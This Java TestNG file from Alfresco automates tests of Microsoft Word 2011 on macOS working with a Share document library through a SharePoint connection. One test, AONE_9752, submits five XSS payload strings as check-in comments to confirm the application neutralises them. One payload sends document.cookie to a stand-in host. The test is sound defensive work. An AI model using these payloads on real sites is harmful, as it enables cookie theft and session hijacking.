/*
 * Copyright (C) 2005-2015 Alfresco Software Limited.
 * This file is part of Alfresco
 * Alfresco is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * Alfresco is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with Alfresco. If not, see <http://www.gnu.org/licenses/>.
 */

package org.alfresco.share.sharepoint.office2011;

import java.io.File;

import org.alfresco.application.mac.MicrosoftWord2011;
import org.alfresco.po.share.site.document.DocumentDetailsPage;
import org.alfresco.share.util.DocumentLibraryUtil;
import org.alfresco.share.util.FileBaseUtils;
import org.alfresco.share.util.ShareUser;
import org.alfresco.share.util.ShareUserSitePage;
import org.alfresco.test.FailedTestListener;
import org.apache.log4j.Logger;
import org.testng.Assert;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Listeners;
import org.testng.annotations.Optional;
import org.testng.annotations.Parameters;
import org.testng.annotations.Test;

/**
 * Please pay attention that there is an error that sometimes occurs on Office2011 application on MAC: issue logged as MNT-12847
 * 
 * @description
 *              This tests should be executed ONLY on a OSx system, where Office2011 is installed
 *              The Alfresco Server version should be lower than 5.0 (Alfresco Enterprise v4.2.5 version was used on Tests)
 * @author Paul Brodner
 */
@Listeners(FailedTestListener.class)
public class MSWord2011Tests extends MS2011BaseTest
{
    private File docMacOfficeFile;

    private File doc9737TestFile;
    private File doc9738TestFile;
    private File doc9739TestFile;
    private File doc9740TestFile;
    private File doc9741TestFile;

    private File doc9743TestFile;
    private File doc9744TestFile;
    private File doc9745TestFile;
    private File doc9752TestFile;
    private File doc9753TestFile;
    private File doc9754TestFile;

    private static final Logger logger = Logger.getLogger(MSWord2011Tests.class);

    @BeforeClass(alwaysRun = true)
    @Parameters({ "TESTID" })
    public void setup(@Optional String TESTID) throws Exception
    {
        super.setup(TESTID);

        appWord2011 = new MicrosoftWord2011();
        appWord2011.killProcesses();

        // used from testdata folder
        docMacOfficeFile = getTestDataFile(SHAREPOINT, "MacOffice.docx");
        doc9737TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9737.docx");

        doc9738TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9738.docx");
        doc9739TestFile = getDuplicatedFile(docMacOfficeFile, "AONE9739crash.docx");
        doc9740TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9740.docx");
        doc9741TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9741.docx");

        doc9743TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9743.docx");
        doc9744TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9744.docx");
        doc9745TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9745.docx");
        doc9752TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9752.docx");
        doc9753TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9753.docx");
        doc9754TestFile = getDuplicatedFile(docMacOfficeFile, "AONE-9754.docx");

        // this files will be uploaded on dataprep
        testFiles.add(doc9738TestFile);
        testFiles.add(doc9739TestFile);
        testFiles.add(doc9740TestFile);
        testFiles.add(doc9741TestFile);
        testFiles.add(doc9743TestFile);
        testFiles.add(doc9744TestFile);
        testFiles.add(doc9745TestFile);
        testFiles.add(doc9752TestFile);
        testFiles.add(doc9753TestFile);
        testFiles.add(doc9754TestFile);
    }

    @Override
    @AfterClass(alwaysRun = true)
    public void tearDown()
    {
        try
        {
            appWord2011.handleCrash();
            appWord2011.getMDC().exitApplication();
            appWord2011.exitApplication();
        }
        catch (Exception e)
        {
            logger.error("Error on TearDown Office 2011" + e.getMessage());
        }
        super.tearDown();
    }

    @Test(groups = { "DataPrepMacWord" })
    public void dataPrep_AONE() throws Exception
    {
        initializeDataPrep();
    }

    /**
     * Any site is created in Share;
     * Any MS Word document is created on a local client machine;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     */
    @Test(groups = "Enterprise4.2", description = "Upload the document - Add file action")
    public void AONE_9737() throws Exception
    {
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        String testFile = doc9737TestFile.getName();
        // ---- Step 1 ----
        // ---- Step action ----
        // Click on Add File button.
        // ---- Expected results ----
        // Upload New Files window is opened.
        // ---- Step 2 ----
        // ---- Step action ----
        // Choose the created in the pre-condition document and click on Upload button.
        // ---- Expected results ----
        // The document is uploaded.

        appExcel2011.getMDC().addFile(doc9737TestFile);

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document was uploaded correctly. No data was lost.
        openDocumentLibraryForTest();

        Assert.assertTrue(documentLibraryPage.isFileVisible(testFile), "The document was uploaded corectly.");
        Assert.assertEquals(DocumentLibraryUtil.getDocumentProperties(documentLibraryPage, testFile).size(), 10, "The document was uploaded correctly");
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Word document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Download the document - Save as action")
    public void AONE_9738() throws Exception
    {
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        String testFile = doc9738TestFile.getName();
        File tmpFile = tmpTestFile("docx");
        // ---- Step 1----
        // ---- Step action ----
        // Choose the document and choose Save As action from the context menu.
        // ---- Expected results ----
        // Save document_name.docx As window is opened.
        getMDC().search(testFile);

        // ---- Step 2 ----
        // ---- Step action ----
        // Choose any location, e.g. Desktop, specify any name and click on Save button.
        // ---- Expected results ----
        // The document is downloaded.
        getMDC().saveAsFirstDocumentAs(tmpFile);

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the chosen location, e.g. Desktop.
        // ---- Expected results ----
        // The document was downloaded correctly. No data was lost.
        tmpFile = tmpTestFile("docx");
        boolean fileSaved = FileBaseUtils.waitForFile(tmpFile);

        Assert.assertTrue(fileSaved, "The document " + tmpFile.getName() + " was saved localy from MDC.");
        Assert.assertEquals(tmpFile.length(), 11383, "No data was lost.");
        tmpFile.delete();
        getMDC().exitApplication();
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Word document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "Enterprise4.2", description = "Read document")
    public void AONE_9739() throws Exception
    {
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        String testFile = doc9739TestFile.getName();

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Read button.
        // ---- Expected results ----
        // The document is opened in a read-only mode.
        getMDC().search(testFile);
        getMDC().readFirstDocument();
        appWord2011.addCredentials(testUser, DEFAULT_PASSWORD);

        boolean isReadOnly = appWord2011.isFileInReadOnlyMode(testFile);
        Assert.assertTrue(isReadOnly, "The document is opened in a read-only mode.");
        getMDC().focus();

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is not locked. No changes are made.
        openDocumentLibraryForTest();
        boolean isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, testFile);
        Assert.assertFalse(isLocked, "The document is not locked. No changes are made.");

        // ---- Step 3 ----
        // ---- Step action ----
        // Try to enter any changes to the opened document.
        // ---- Expected results ----
        // No changes can be made. The document is read-only.
        // {Paul: nothing to add here}

        // ---- Step 4 ----
        // ---- Step action ----
        // Try to check out the opened document.
        // ---- Expected results ----
        // The document cannot be checked out. "You can't edit this file. You have the file open as read-only. To edit the file, close it, and then try again."
        // dialog message is displayed.
        // {Paul: cannot reproduce this on MAC. In this case the Checkout button is disabled, so I check for this functionality}

        Assert.assertEquals(getMDC().isBtnCheckOutEnabled(), 0, "The file cannot be Checked out");
        getMDC().exitApplication();
        appWord2011.exitApplication();
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Excel document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection§ to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Edit document")
    public void AONE_9740() throws Exception
    {
        openDocumentLibraryForTest();
        String testFile = doc9740TestFile.getName();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Edit button.
        // ---- Expected results ----
        // The document is opened in a read-write mode.
        getMDC().search(testFile);
        getMDC().editFirstDocument();
        appWord2011.addCredentials(testUser, DEFAULT_PASSWORD);
        appWord2011.waitForWindow(testFile);

        boolean isEditMode = appWord2011.isFileInEditMode(testFile);
        Assert.assertTrue(isEditMode, "The document is opened in a read-write mode.");

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is locked. "This document is locked by you." message is displayed.
        ShareUser.openDocumentLibrary(drone);
        boolean isLocked = DocumentLibraryUtil.isFileLockedByYou(documentLibraryPage, testFile);
        Assert.assertTrue(isLocked, "The document is locked. \"This document is locked by you.\" message is displayed.");

        // ---- Step 3 ----
        // ---- Step action ----
        // Try to enter any changes to the opened document.
        // ---- Expected results ----
        // The changes can be entered.
        appWord2011.waitForWindow(testFile);
        appWord2011.setFileName(testFile);
        appWord2011.focus();
        appWord2011.edit("some test data");

        // ---- Step 4 ----
        // ---- Step action ----
        // Try to check out the opened document.
        // ---- Expected results ----
        // The document's changes are saved automatically. The document is checked out.
        // {Paul: on MDC we cannot Checkout document after we EDIT. On EDIT, the document is auto-checked out. At this point can just SAVE the file}
        appWord2011.save();

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // Previously applied changes are present. A new minor version is created. The document is locked. "This document is locked by you for offline editing."
        // message is displayed.
        // {Paul: the document was not checked out. It was only Edited. This message will apply on checkout operation. We have a distinct test case for this:
        // AONE-9766}

        ShareUser.openDocumentLibrary(drone);
        isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, testFile);
        Assert.assertTrue(isLocked, "This document is locked by you for offline editing.");

        // check we have a new minor version
        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new minor version is created.");

        appWord2011.closeFile(testFile);
        getMDC().exitApplication();
        appWord2011.exitApplication();
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Word document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * <li>Any data is entered into the opened document.</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Edit document - Upload Changes")
    public void AONE_9741() throws Exception
    {
        openDocumentLibraryForTest();
        String testFile = doc9741TestFile.getName();
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Upload button.
        // ---- Expected results ----
        // Upload Changes window is displayed.
        getMDC().search(testFile);
        getMDC().editFirstDocument();
        appWord2011.addCredentials(testUser, DEFAULT_PASSWORD);

        // {Paul: cannot use Open URL, Application will crash}
        // appExcel2011.openURL(getVTIDocumentLibraryFilePath(testSiteName, xlsCommonFile.getName()));

        // ---- Step 2 ----
        // ---- Step action ----
        // Click on Upload Changes button.
        // ---- Expected results ----
        // The changes are uploaded. The file is still opened for editing.
        appWord2011.waitForWindow(testFile);
        appWord2011.edit("From Paris, with Love");
        appWord2011.setFileName(testFile);
        appWord2011.save();

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The changes are applied. A new minor version is created. The document is still locked for editing.

        docDetailsPage.getDrone().refresh();
        docDetailsPage.getDrone().getCurrentPage().render();

        boolean isLocked = docDetailsPage.isCheckedOut();
        Assert.assertTrue(isLocked, "The document is still locked for editing.");

        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new minor version is created.");

        appWord2011.exitApplication();
        ShareUser.logout(drone);
    }

    /**
     * Any site is created in Share;
     * Any MS Word document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     */
    @Test(groups = "Enterprise4.2", description = "Check Out")
    public void AONE_9743() throws Exception
    {
        String testFile = doc9743TestFile.getName();
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Check Out button.
        // ---- Expected results ----
        // The document is checked out and is opened for editing in a write mode in the default MS Excel app.

        getMDC().checkOutFile(testFile);
        openDocumentLibraryForTest();
        appWord2011.waitForWindow(testFile);
        appWord2011.exitApplication();

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is locked. "The document is locked by you for offline editing" message is displayed.
        Assert.assertEquals(ShareUserSitePage.getFileDirectoryInfo(drone, testFile).getContentInfo(), "This document is locked by you for offline editing.");
    }

    /**
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is checked out and is opened for editing.
     */
    @Test(groups = "Enterprise4.2", description = "Edit checked out document")
    public void AONE_9744() throws Exception
    {
        String testFile = doc9744TestFile.getName();
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        getMDC().checkOutFile(testFile);
        openDocumentLibraryForTest();
        appWord2011.waitForWindow(testFile);

        // ---- Step 1 ----
        // ---- Step action ----
        // Enter any data.
        // ---- Expected results ----
        // he data is entered.
        appWord2011.edit("edit with some data");
        appWord2011.setFileName(testFile);
        appWord2011.saveAndClose();
        getMDC().focus();

        // ---- Step 2 ----
        // ---- Step action ----
        // Save the document and close MS Excel app
        // ---- Expected results ----
        // The document is saved successfully. The document is still checked out.
        Assert.assertEquals(getMDC().isBtnCheckOutEnabled(), 0);

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is locked. "The document is locked by you for offline editing" message is displayed. No changes are present. No new versions were
        // created.
        appWord2011.exitApplication();
        boolean isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, testFile);
        Assert.assertTrue(isLocked, "This document is locked by you for offline editing.");
    }

    /**
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is opened for editing.
     * Any data is entered into the opened document.
     */
    @Test(groups = "Enterprise4.2", description = "Edit document - Save the changes")
    public void AONE_9745() throws Exception
    {
        String testFile = doc9745TestFile.getName();

        openDocumentLibraryForTest();
        appWord2011.openApplication();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        getMDC().search(testFile);
        getMDC().editFirstDocument();
        appWord2011.addCredentials(testUser, DEFAULT_PASSWORD);
        appWord2011.waitForWindow(testFile);
        appWord2011.edit("edit with some data");

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the File > Save action.
        // ---- Expected results ----
        // The document is saved correctly.
        appWord2011.save();

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The changes are applied. A new minor version is created. The document is still locked.
        documentLibraryPage.getDrone().refresh();
        documentLibraryPage.getDrone().refresh();

        // check we have a new minor version
        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
        Assert.assertTrue(docDetailsPage.isLockedByYou(), "The document is still locked.");

        // ---- Step 3 ----
        // ---- Step action ----
        // Close the document and the MS Excel app.
        // ---- Expected results ----
        // The document is closed.
        appWord2011.closeFile(testFile);
        appWord2011.waitUntilFileCloses(testFile);
        Assert.assertFalse(appWord2011.isFileOpened(testFile));

        // ---- Step 4 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is unlocked and was not changed. No new version were created.
        documentLibraryPage.getDrone().refresh();

        // check we have a new minor version
        currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "No new version were created.");
        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked and was not changed.");
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened;
     * The document is checked out;
     * Some changes are made for the document;
     * The changes are saved and Word app is closed.
     */
    @Test(groups = "Enterprise4.2", description = "Check In document. Comment with XSS")
    public void AONE_9752() throws Exception
    {

        String[] xssComments = new String[5];
        xssComments[0] = "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">";
        xssComments[1] = "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">";
        xssComments[2] = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
        xssComments[3] = "<IMG STYLE=\"xss:expr/*XSS*/session(alert('XSS'))\">";
        xssComments[4] = "<img><scrip<script>t>alert('XSS');<</script>/script>";

        String strCheckInComment = "";
        String testFile = doc9752TestFile.getName();
        String currentVersion = "";

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();

        for (int i = 0; i < xssComments.length; i++)
        {

            strCheckInComment = xssComments[i];

            getMDC().checkOutFile(testFile);
            appWord2011.waitForWindow(testFile);
            appWord2011.setFileName(testFile);
            appWord2011.focus();
            appWord2011.save();
            appWord2011.closeFile();

            documentLibraryPage.getDrone().refresh();
            String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

            // ---- Step 1 ----
            // ---- Step action ----
            // Click on the document and then click on the Check In button on the top panel.
            // ---- Expected results ----
            // Check In window is displayed.
            getMDC().clickFirstDocument();

            // ---- Step 2 ----
            // ---- Step action ----
            // Enter one of the following strings to the Comments section:
            // <IMG """><SCRIPT>alert("test")</SCRIPT>">
            // <img src="1" onerror="window.open('http://somenastyurl?'+(document.cookie))">
            // <DIV STYLE="width: expression(alert('XSS'));">
            // <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
            // <img><scrip<script>t>alert('XSS');<</script>/script>
            // ---- Expected results ----
            // Comment is entered. No XSS attack is made.

            // ---- Step 3 ----
            // ---- Step action ----
            // Click on CheckIn button button.
            // ---- Expected results ----
            // Check In window is closed. No XSS attack is made. Data proceeded correctly. The document is not marked as checked out.
            getMDC().clickCheckIn();
            getMDC().checkInWithComment(strCheckInComment);

            // ---- Step 4 ----
            // ---- Step action ----
            // Log into the Share.
            // ---- Expected results ----
            // User is logged in successfully.

            // {paulb: we are already logged in from prerequisites}

            // ---- Step 5 ----
            // ---- Step action ----
            // Verify the document.
            // ---- Expected results ----
            // The document is checked in. Changes are applied. Version is increased to a new major version. Entered string is added as a comment. No XSS attack
            // is made.
            documentLibraryPage.getDrone().refresh();

            currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
            Assert.assertFalse(docDetailsPage.isCheckedOut(), "The document is checked in.");
            Assert.assertNotEquals(oldVersion, currentVersion, "Changes are applied. Version is increased to a new major version.");
            Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment,
                    "Entered string is added as a comment. No XSS attack is made");

            // ---- Step 6 ----
            // ---- Step action ----
            // Verify the same scenario against all the left strings.
            // ---- Expected results ----
            // Performed correctly. No XSS attack is made.
            // {paulb: see the loop above}
        }

        getMDC().exitApplication();
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened;
     * The document is checked out;
     * Some changes are made for the document;
     * The changes are saved and Word app is closed.
     */
    @Test(groups = "Enterprise4.2", description = "Check In document. Empty comment")
    public void AONE_9753() throws Exception
    {

        String testFile = doc9753TestFile.getName();
        String currentVersion = "";

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();

        getMDC().checkOutFile(testFile);
        appWord2011.waitForWindow(testFile);
        appWord2011.setFileName(testFile);
        appWord2011.focus();
        appWord2011.save();
        appWord2011.closeFile();

        documentLibraryPage.getDrone().refresh();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        // ---- Step 1 ----
        // ---- Step action ----
        // Click on the document and then click on the Check In button on the top panel.
        // ---- Expected results ----
        // Check In window is displayed.
        getMDC().clickFirstDocument();

        // ---- Step 2 ----
        // ---- Step action ----
        // Leave the Comments section empty.
        // ---- Expected results ----
        // No data is entered.

        // ---- Step 3 ----
        // ---- Step action ----
        // Click on CheckIn button button.
        // ---- Expected results ----
        // Check In window is closed. No XSS attack is made. Data proceeded correctly. The document is not marked as checked out.
        getMDC().clickCheckIn();
        getMDC().checkInWithComment(" ");

        // ---- Step 4 ----
        // ---- Step action ----
        // Log into the Share.
        // ---- Expected results ----
        // User is logged in successfully.

        // {paulb: we are already logged in from prerequisites}

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document.
        // ---- Expected results ----
        // The document is checked in. Changes are applied. Version is increased to a new major version. Entered string is added as a comment. No XSS attack
        // is made.
        documentLibraryPage.getDrone().refresh();

        currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertFalse(docDetailsPage.isCheckedOut(), "The document is checked in.");
        Assert.assertNotEquals(oldVersion, currentVersion, "Changes are applied. Version is increased to a new major version.");
        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), "(No Comment)", "No comment is added to the version.");

        getMDC().exitApplication();
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened;
     * The document is checked out;
     * Some changes are made for the document;
     * The changes are saved and Word app is closed.
     */
    @Test(groups = "Enterprise4.2", description = "Check In document. Comment with wildcards")
    public void AONE_9754() throws Exception
    {

        String testFile = doc9754TestFile.getName();
        String currentVersion = "";
        String strComment = "!@#$%^&*()_+|\\/?.,<>:;\"'`=-{}[]";

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();

        getMDC().checkOutFile(testFile);
        appWord2011.waitForWindow(testFile);
        appWord2011.setFileName(testFile);
        appWord2011.focus();
        appWord2011.save();
        appWord2011.closeFile();

        documentLibraryPage.getDrone().refresh();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        // ---- Step 1 ----
        // ---- Step action ----
        // Click on the document and then click on the Check In button on the top panel.
        // ---- Expected results ----
        // Check In window is displayed.
        getMDC().clickFirstDocument();

        // ---- Step 2 ----
        // ---- Step action ----
        // Enter any string which contains wildcards to the Comments section, e.g. !@#$%^&*()_+|\/?.,<>:;"'`=-{}[].
        // ---- Expected results ----
        // Data is entered.

        // ---- Step 3 ----
        // ---- Step action ----
        // Click on CheckIn button button.
        // ---- Expected results ----
        // Check In window is closed. Data proceeded correctly. The document is not marked as checked out.
        getMDC().clickCheckIn();
        getMDC().checkInWithComment(strComment);

        // ---- Step 4 ----
        // ---- Step action ----
        // Log into the Share.
        // ---- Expected results ----
        // User is logged in successfully.

        // {paulb: we are already logged in from prerequisites}

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document.
        // ---- Expected results ----
        // The document is checked in. Changes are applied. Version is increased to a new major version. Entered string is added as a comment. No XSS attack
        // is made.
        documentLibraryPage.getDrone().refresh();

        currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertFalse(docDetailsPage.isCheckedOut(), "The document is checked in.");
        Assert.assertNotEquals(oldVersion, currentVersion, "Changes are applied. Version is increased to a new major version.");
        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strComment, "No comment is added to the version.");

        getMDC().exitApplication();
    }
}
